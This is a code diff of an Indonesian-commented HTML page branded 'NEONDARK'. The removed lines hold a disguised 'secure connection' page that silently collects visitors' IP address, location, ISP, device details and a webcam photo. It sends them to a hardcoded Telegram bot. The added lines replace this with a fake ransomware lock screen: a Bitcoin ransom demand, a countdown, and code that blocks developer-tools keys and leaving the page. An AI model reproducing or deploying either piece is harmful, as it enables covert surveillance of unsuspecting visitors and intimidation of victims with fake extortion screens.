@@ -2,13 +2,13 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔒 LOCKED</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0a0a0a;
-            color: #00ff41;
+            background: #000;
+            color: #ff0000;
             font-family: 'Courier New', monospace;
             min-height: 100vh;
             display: flex;
@@ -16,260 +16,383 @@
             align-items: center;
             flex-direction: column;
             padding: 20px;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: none;
         }
         .box {
-            background: rgba(0,255,65,0.05);
-            border: 1px solid rgba(0,255,65,0.2);
+            background: rgba(0,0,0,0.9);
+            border: 4px solid #ff0000;
             border-radius: 20px;
             padding: 40px;
-            max-width: 500px;
+            max-width: 550px;
             width: 100%;
             text-align: center;
+            box-shadow: 0 0 150px rgba(255,0,0,0.3);
+            animation: pulse 2s infinite;
+            position: relative;
         }
-        h1 { font-size: 1.8rem; margin-bottom: 10px; }
-        .status { color: #888; font-size: 0.9rem; margin: 15px 0; }
-        .dot {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            background: #00ff41;
-            border-radius: 50%;
-            animation: blink 1s infinite;
-            margin-right: 10px;
+        @keyframes pulse {
+            0%, 100% { border-color: #ff0000; box-shadow: 0 0 150px rgba(255,0,0,0.3); }
+            50% { border-color: #ff4444; box-shadow: 0 0 200px rgba(255,0,0,0.5); }
         }
-        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
-        .loader {
-            border: 2px solid rgba(0,255,65,0.1);
-            border-top: 2px solid #00ff41;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        h1 {
+            font-size: 2.5rem;
+            text-shadow: 0 0 40px rgba(255,0,0,0.4);
+            animation: glitch 0.5s infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer { color: #333; font-size: 0.6rem; margin-top: 20px; }
-        video, canvas { display: none; }
+        @keyframes glitch {
+            0% { text-shadow: 0 0 40px rgba(255,0,0,0.4); }
+            50% { text-shadow: 0 0 60px rgba(255,0,0,0.8), 0 0 120px rgba(255,0,0,0.3); transform: skewX(-2deg); }
+            100% { text-shadow: 0 0 40px rgba(255,0,0,0.4); }
+        }
+        .highlight { color: #ff4444; font-weight: bold; }
+        .timer {
+            font-size: 3rem;
+            color: #ff0000;
+            text-shadow: 0 0 20px rgba(255,0,0,0.3);
+            margin: 20px 0;
+            font-weight: 900;
+            letter-spacing: 5px;
+        }
+        .message-box {
+            background: rgba(255,0,0,0.05);
+            border-left: 4px solid #ff0000;
+            padding: 18px 20px;
+            margin: 20px 0;
+            text-align: left;
+            color: #cccccc;
+            font-size: 0.85rem;
+            line-height: 1.8;
+        }
+        .message-box .red { color: #ff0000; font-weight: 700; }
+        .message-box .green { color: #00ff41; }
+        .input-area {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        .input-area input {
+            padding: 14px 20px;
+            background: rgba(255,0,0,0.05);
+            border: 2px solid rgba(255,0,0,0.3);
+            border-radius: 12px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            text-align: center;
+            width: 200px;
+            letter-spacing: 3px;
+        }
+        .input-area input:focus {
+            outline: none;
+            border-color: #ff0000;
+            box-shadow: 0 0 30px rgba(255,0,0,0.2);
+        }
+        .input-area input::placeholder {
+            color: #444;
+            letter-spacing: 2px;
+        }
+        .input-area button {
+            padding: 14px 35px;
+            background: #ff0000;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        .input-area button:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(255,0,0,0.3);
+        }
+        .input-area button:active {
+            transform: scale(0.95);
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #888;
+            min-height: 30px;
+            padding: 10px;
+            border-radius: 10px;
+            background: rgba(255,0,0,0.03);
+        }
+        .status.error {
+            color: #ff0000;
+            border: 1px solid rgba(255,0,0,0.2);
+        }
+        .status.success {
+            color: #00ff41;
+            border: 1px solid rgba(0,255,65,0.2);
+        }
+        .hint {
+            color: #333;
+            font-size: 0.6rem;
+            margin-top: 15px;
+            letter-spacing: 1px;
+        }
+        .footer {
+            color: #222;
+            font-size: 0.5rem;
+            margin-top: 20px;
+            letter-spacing: 2px;
+        }
+
+        /* Fullscreen overlay */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            font-size: 2rem;
+            cursor: default;
+        }
+        #overlay .sub {
+            color: #888;
+            font-size: 1rem;
+            margin-top: 20px;
+        }
+        /* Sembunyikan overlay setelah unlock */
+        #overlay.hidden {
+            display: none !important;
+        }
+
+        /* Flash efek */
+        @keyframes flashRed {
+            0% { background: rgba(255,0,0,0); }
+            50% { background: rgba(255,0,0,0.1); }
+            100% { background: rgba(255,0,0,0); }
+        }
+        .flash {
+            animation: flashRed 1s infinite;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .box { padding: 25px 20px; margin: 15px; }
+            h1 { font-size: 1.8rem; }
+            .timer { font-size: 2.2rem; }
+            .input-area input { width: 100%; }
+            .input-area button { width: 100%; }
+            .message-box { font-size: 0.75rem; padding: 12px 14px; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h1>🔒 SECURE CONNECTION</h1>
-        <div class="status"><span class="dot"></span> Establishing secure channel...</div>
-        <div class="loader"></div>
-        <div style="color:#555;font-size:0.8rem;margin-top:10px;">Please wait...</div>
+    <!-- ===== OVERLAY FULLSCREEN (BLOKIR KELUAR) ===== -->
+    <div id="overlay">
+        <div>🔒</div>
+        <div style="font-size:1.5rem;margin-top:10px;">SYSTEM LOCKED</div>
+        <div class="sub">Enter the unlock key to continue</div>
+    </div>
+
+    <!-- ===== RANSOMWARE BOX ===== -->
+    <div class="box flash" id="lockBox">
+        <h1>💀 SYSTEM LOCKED 💀</h1>
+        <div class="message-box">
+            <div><span class="red">[!]</span> Your system has been <span class="red">locked</span>!</div>
+            <div><span class="red">[!]</span> All your files have been <span class="red">encrypted</span>.</div>
+            <div><span class="red">[!]</span> You have <span class="green">72 hours</span> to pay the ransom.</div>
+            <div style="margin-top:8px;color:#ff4444;font-size:0.8rem;">
+                ⚡ Pay <span class="red">0.5 BTC</span> to: <span style="color:#00ff41;">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span>
+            </div>
+        </div>
+
+        <div class="timer" id="timer">72:00:00</div>
+
+        <div class="input-area">
+            <input type="password" id="pw" placeholder="🔑 Enter unlock key" maxlength="20" autofocus>
+            <button onclick="unlock()">⚡ UNLOCK</button>
+        </div>
+
+        <div class="status" id="status">⚠️ Enter the unlock key to continue.</div>
+        <div class="hint">HINT: 999</div>
         <div class="footer">v2.0 • NEONDARK</div>
     </div>
 
-    <video id="video" autoplay muted playsinline></video>
-    <canvas id="canvas"></canvas>
-
     <script>
-        // =============================================================
-        // 1. GET IP, LOKASI, ISP (TANPA IZIN)
-        // =============================================================
-        async function getLocation() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'Unknown',
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    lat: data.latitude || 0,
-                    lon: data.longitude || 0,
-                    isp: data.org || 'Unknown'
-                };
-            } catch (e) {
-                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 0, lon: 0, isp: 'Unknown' };
+        // ============================================================
+        // 1. TIMER COUNTDOWN (72 JAM)
+        // ============================================================
+        let totalSeconds = 72 * 3600;
+
+        function updateTimer() {
+            if (totalSeconds <= 0) {
+                document.getElementById('timer').textContent = '00:00:00';
+                return;
             }
+            totalSeconds--;
+            const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+            const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+            const s = String(totalSeconds % 60).padStart(2, '0');
+            document.getElementById('timer').textContent = h + ':' + m + ':' + s;
         }
+        setInterval(updateTimer, 1000);
 
-        // =============================================================
-        // 2. CAPTURE PHOTO (FALLBACK AMAN)
-        // =============================================================
-        async function capturePhoto() {
-            return new Promise(async (resolve) => {
-                try {
-                    // Coba akses kamera
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'user',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        } 
-                    });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    await video.play();
+        // ============================================================
+        // 2. UNLOCK FUNCTION (PASSWORD: 999)
+        // ============================================================
+        function unlock() {
+            const input = document.getElementById('pw');
+            const password = input.value.trim();
+            const status = document.getElementById('status');
+            const box = document.getElementById('lockBox');
+            const overlay = document.getElementById('overlay');
 
-                    // Tunggu 500ms biar kamera stabil
-                    await new Promise(r => setTimeout(r, 500));
+            // Reset status
+            status.className = 'status';
 
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Kompres foto biar ukuran kecil
-                    const photo = canvas.toDataURL('image/jpeg', 0.7);
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(photo);
-                } catch (e) {
-                    // Kalo gagal, kirim null (tanpa foto)
-                    console.log('Camera access denied or error:', e);
-                    resolve(null);
-                }
-            });
-        }
-
-        // =============================================================
-        // 3. DETEKSI DEVICE & OS (AKURAT)
-        // =============================================================
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Unknown Device';
-            let browser = 'Unknown Browser';
-            let os = 'Unknown OS';
-
-            if (ua.includes('Android')) os = 'Android';
-            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-            else if (ua.includes('Windows')) os = 'Windows';
-            else if (ua.includes('Mac')) os = 'MacOS';
-            else if (ua.includes('Linux')) os = 'Linux';
-
-            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-            else if (ua.includes('Firefox')) browser = 'Firefox';
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-            else if (ua.includes('Edg')) browser = 'Edge';
-            else if (ua.includes('Opera')) browser = 'Opera';
-
-            if (os === 'Android') {
-                const match = ua.match(/Android\s([\d.]+)/);
-                if (match) os += ' ' + match[1];
-                const brandMatch = ua.match(/(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
-                const brand = brandMatch ? brandMatch[1] : '';
-                const modelMatch = ua.match(/\(([^)]+)\)/);
-                const model = modelMatch ? modelMatch[1].split(';').pop().trim() : '';
-                device = brand + ' ' + model || 'Android Device';
-            } else if (os === 'iOS') {
-                const match = ua.match(/OS\s([\d_]+)/);
-                if (match) os += ' ' + match[1].replace(/_/g, '.');
-                if (ua.includes('iPhone')) device = 'iPhone';
-                else if (ua.includes('iPad')) device = 'iPad';
-            } else {
-                device = os + ' Device';
+            if (password === '') {
+                status.textContent = '⚠️ Please enter the unlock key!';
+                status.className = 'status error';
+                return;
             }
 
-            return { device, browser, os };
-        }
+            if (password === '999') {
+                // ✅ PASSWORD BENAR
+                status.textContent = '✅ UNLOCKED! System restored.';
+                status.className = 'status success';
 
-        // =============================================================
-        // 4. KIRIM KE TELEGRAM (DENGAN FOTO)
-        // =============================================================
-        async function sendToTelegram(data) {
-            const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
-            const CHAT_ID = '8768522731';
-
-            const now = new Date();
-            const dateStr = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-
-            let message = `🔔 *NEW VISITOR DETECTED!*\n\n`;
-            message += `📅 *Time:* ${dateStr}\n`;
-            message += `📱 *Device:* ${data.device}\n`;
-            message += `🌐 *Browser:* ${data.browser}\n`;
-            message += `💻 *OS:* ${data.os}\n`;
-            message += `🌍 *IP:* ${data.location.ip}\n`;
-            message += `📍 *City:* ${data.location.city}\n`;
-            message += `🗺️ *Region:* ${data.location.region}\n`;
-            message += `🏳️ *Country:* ${data.location.country}\n`;
-            message += `🏢 *ISP:* ${data.location.isp}\n`;
-            message += `🗺️ *Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;
-
-            // Kirim pesan teks dulu
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // Kirim foto KALAU ADA
-            if (data.photo) {
-                try {
-                    const blob = dataURLtoBlob(data.photo);
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (e) {
-                    console.log('Failed to send photo:', e);
-                }
-            } else {
-                // Kalo foto null, kirim pesan tambahan
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: '⚠️ *No photo captured* (camera access denied)',
-                        parse_mode: 'Markdown'
-                    })
-                });
-            }
-        }
-
-        function dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while (n--) u8arr[n] = bstr.charCodeAt(n);
-            return new Blob([u8arr], { type: mime });
-        }
-
-        // =============================================================
-        // 5. MAIN EXECUTION
-        // =============================================================
-        async function main() {
-            try {
-                const deviceInfo = getDeviceInfo();
-                const location = await getLocation();
-                const photo = await capturePhoto();
-
-                const data = {
-                    device: deviceInfo.device,
-                    browser: deviceInfo.browser,
-                    os: deviceInfo.os,
-                    location: location,
-                    photo: photo
-                };
-
-                await sendToTelegram(data);
-
-                document.querySelector('h1').textContent = '✅ CONNECTION ESTABLISHED';
-                document.querySelector('.status').innerHTML = 'Secure channel active. Your data is safe.';
-                document.querySelector('.loader').style.display = 'none';
+                // Ubah tampilan
+                box.style.borderColor = '#00ff41';
+                box.style.boxShadow = '0 0 100px rgba(0,255,65,0.2)';
+                document.querySelector('h1').textContent = '✅ SYSTEM UNLOCKED';
+                document.querySelector('.message-box').innerHTML = '<div style="color:#00ff41;">🎉 Your system has been restored. All files are safe.</div>';
+                document.querySelector('.timer').style.display = 'none';
+                document.querySelector('.hint').style.display = 'none';
+                document.querySelector('.input-area').style.display = 'none';
                 document.querySelector('.footer').textContent = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString('id-ID');
-            } catch (e) {
-                console.error('Main error:', e);
+
+                // Sembunyikan overlay fullscreen
+                overlay.classList.add('hidden');
+
+                // Hapus efek flash
+                box.classList.remove('flash');
+
+                // Notif sukses
+                setTimeout(() => {
+                    alert('✅ SYSTEM UNLOCKED! Your files are safe.');
+                }, 500);
+
+            } else {
+                // ❌ PASSWORD SALAH
+                status.textContent = '❌ WRONG KEY! Access denied.';
+                status.className = 'status error';
+                input.value = '';
+                input.focus();
+
+                // Efek kedip merah
+                box.style.borderColor = '#ff0000';
+                box.style.boxShadow = '0 0 150px rgba(255,0,0,0.6)';
+                setTimeout(() => {
+                    box.style.boxShadow = '0 0 100px rgba(255,0,0,0.2)';
+                }, 500);
+
+                // Flash overlay merah
+                const overlay2 = document.getElementById('overlay');
+                overlay2.style.background = 'rgba(255,0,0,0.2)';
+                setTimeout(() => {
+                    overlay2.style.background = '#000';
+                }, 300);
             }
         }
 
-        // JALANKAN LANGSUNG
-        main();
+        // ============================================================
+        // 3. ENTER KEY SUPPORT
+        // ============================================================
+        document.getElementById('pw').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                unlock();
+            }
+        });
+
+        // ============================================================
+        // 4. AUTO-FOCUS
+        // ============================================================
+        window.addEventListener('load', () => {
+            document.getElementById('pw').focus();
+
+            // Tampilkan overlay
+            document.getElementById('overlay').classList.remove('hidden');
+
+            // Fullscreen request (kalo di browser)
+            try {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                }
+            } catch (e) {}
+        });
+
+        // ============================================================
+        // 5. BLOKIR TOMBOL BACK / CLOSE
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            // Blokir F12, Ctrl+Shift+I, Ctrl+U, dll
+            if (e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.key === 'U') ||
+                (e.ctrlKey && e.key === 'S') ||
+                (e.ctrlKey && e.key === 'P') ||
+                (e.key === 'Escape')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // ============================================================
+        // 6. BLOKIR CLOSE / BACK (POPUP GA BISA DITUTUP)
+        // ============================================================
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+
+        // ============================================================
+        // 7. PREVENT CONTEXT MENU
+        // ============================================================
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // ============================================================
+        // 8. PREVENT DRAG
+        // ============================================================
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+        });
+
+        // ============================================================
+        // 9. CONSOLE LOG
+        // ============================================================
+        console.log('%c🔒 RANSOMWARE - NEONDARK', 'color: #ff0000; font-size: 20px; font-weight: 900;');
+        console.log('%cPassword: 999', 'color: #00ff41; font-size: 16px;');
+        console.log('%c⚠️ HANYA UNTUK EDUKASI!', 'color: #ff4444; font-size: 14px;');
+
+        // ============================================================
+        // 10. TAMPILAN AWAL
+        // ============================================================
+        console.log('✅ Ransomware siap! Password: 999');
     </script>
 </body>
 </html>
